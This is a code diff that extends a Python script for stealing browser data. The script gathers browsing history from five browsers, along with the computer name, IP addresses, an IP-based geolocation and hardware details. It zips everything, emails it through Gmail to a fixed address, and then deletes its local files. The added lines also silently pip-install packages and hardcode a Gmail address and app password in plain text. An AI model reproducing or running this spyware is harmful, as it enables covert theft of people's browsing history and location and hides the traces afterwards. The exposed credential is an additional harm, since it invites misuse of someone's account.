@@ -6,30 +6,49 @@ from email import encoders
 import os
 from shutil import copyfile
 import zipfile
+import socket
+import requests
+import platform
+import subprocess
+import json
 
-def send_email(filename, attachment, to_addr):
-    from_addr = 'Your Gmail Email Address Here'   # Your Gmail Email Address
-    app_password = 'Your Gmail App Password Here'  # Your Gmail App Password Aka An SMTP Server API Key
+# Install required packages if not already installed
+def install_packages():
+    try:
+        import psutil
+    except ImportError:
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'psutil'])
+
+    try:
+        import GPUtil
+    except ImportError:
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'GPUtil'])
+
+install_packages()
+import psutil
+import GPUtil
+
+def send_email(subject, body, attachment_path, to_addr):
+    from_addr = 'usbbasher@gmail.com'
+    app_password = 'rlna hczz uykv catc'  # Your app password
 
     msg = MIMEMultipart()
     msg['From'] = from_addr
     msg['To'] = to_addr
-    msg['Subject'] = 'Browsing History and Data'
+    msg['Subject'] = subject
 
-    body = 'Attached is the browsing history and data file.'
     msg.attach(MIMEText(body, 'plain'))
 
-    with open(attachment, 'rb') as f:
+    with open(attachment_path, 'rb') as f:
         part = MIMEBase('application', 'octet-stream')
         part.set_payload(f.read())
         encoders.encode_base64(part)
-        part.add_header('Content-Disposition', f'attachment; filename={filename}')
+        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_path)}')
         msg.attach(part)
 
     try:
-        # Connect to Gmail's SMTP server
         server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()  # Upgrade the connection to a secure encrypted SSL/TLS connection
+        server.starttls()
         server.login(from_addr, app_password)
         server.sendmail(from_addr, to_addr, msg.as_string())
         server.quit()
@@ -72,27 +91,96 @@ def compress_file(file_path):
         zipf.write(file_path, os.path.basename(file_path))
     return zip_file
 
+def get_ip_addresses():
+    ip_addresses = {"IPv4": [], "IPv6": []}
+    for iface, addrs in psutil.net_if_addrs().items():
+        for addr in addrs:
+            if addr.family == socket.AF_INET:
+                ip_addresses["IPv4"].append(addr.address)
+            elif addr.family == socket.AF_INET6:
+                ip_addresses["IPv6"].append(addr.address)
+    return ip_addresses
+
+def get_location():
+    try:
+        response = requests.get("http://ipinfo.io/json")
+        data = response.json()
+        return {
+            "IP": data.get("ip"),
+            "City": data.get("city"),
+            "Region": data.get("region"),
+            "Country": data.get("country"),
+            "Location": data.get("loc"),
+            "Organization": data.get("org"),
+            "Postal": data.get("postal"),
+        }
+    except Exception as e:
+        return {"Error": str(e)}
+
+def get_gpu_info():
+    try:
+        gpus = GPUtil.getGPUs()
+        gpu_info = []
+        for gpu in gpus:
+            gpu_info.append({
+                "Name": gpu.name,
+                "Load": f"{gpu.load * 100}%",
+                "Free Memory": f"{gpu.memoryFree}MB",
+                "Used Memory": f"{gpu.memoryUsed}MB",
+                "Total Memory": f"{gpu.memoryTotal}MB",
+                "Temperature": f"{gpu.temperature}°C"
+            })
+        return gpu_info
+    except Exception as e:
+        return [{"Error": str(e)}]
+
+def get_cpu_info():
+    return {
+        "Processor": platform.processor(),
+        "Cores (Physical)": psutil.cpu_count(logical=False),
+        "Cores (Logical)": psutil.cpu_count(logical=True),
+        "Max Frequency": f"{psutil.cpu_freq().max}Mhz",
+        "Min Frequency": f"{psutil.cpu_freq().min}Mhz",
+        "Current Frequency": f"{psutil.cpu_freq().current}Mhz"
+    }
+
 def main():
+    system_info = {
+        "Computer Name": platform.node(),
+        "IP Addresses": get_ip_addresses(),
+        "Location": get_location(),
+        "GPU Information": get_gpu_info(),
+        "CPU Information": get_cpu_info(),
+    }
+
+    log_file = "system_info_log.json"
+    with open(log_file, "w") as f:
+        json.dump(system_info, f, indent=4)
+
     browsers = ['chrome', 'firefox', 'opera', 'brave', 'edge']
     sent = False
 
     for browser in browsers:
         try:
             history_file = get_browser_history(browser)
-            compressed_file = compress_file(history_file)
-            
-            # Check file size and adjust compression if necessary
-            if os.path.getsize(compressed_file) > 20 * 1024 * 1024:  # If greater than 20MB
-                print(f"Compressed file size is too large: {os.path.getsize(compressed_file)} bytes")
-                # Handle large file size (e.g., further compress, notify user, etc.)
+            compressed_history = compress_file(history_file)
+            if os.path.getsize(compressed_history) > 20 * 1024 * 1024:
+                print(f"Compressed file size is too large: {os.path.getsize(compressed_history)} bytes")
                 continue
             
-            if send_email(os.path.basename(compressed_file), compressed_file, 'usbbasher@gmail.com'):  # Send to yourself
-                # If the email was sent successfully, delete the history and compressed files
+            compressed_log = compress_file(log_file)
+            combined_zip = 'combined_data.zip'
+            with zipfile.ZipFile(combined_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                zipf.write(compressed_history, os.path.basename(compressed_history))
+                zipf.write(compressed_log, os.path.basename(compressed_log))
+
+            if send_email("System and Browser Information", "Attached is the system and browser history data.", combined_zip, 'usbbasher@gmail.com'):
                 os.remove(history_file)
-                os.remove(compressed_file)
-                print(f"Deleted history file: {history_file} and compressed file: {compressed_file}")
-                
+                os.remove(compressed_history)
+                os.remove(compressed_log)
+                os.remove(log_file)
+                os.remove(combined_zip)
+                print(f"Deleted history file: {history_file}, compressed history: {compressed_history}, compressed log: {compressed_log}, log file: {log_file}, and combined zip: {combined_zip}")
                 sent = True
                 break
         except Exception as e:
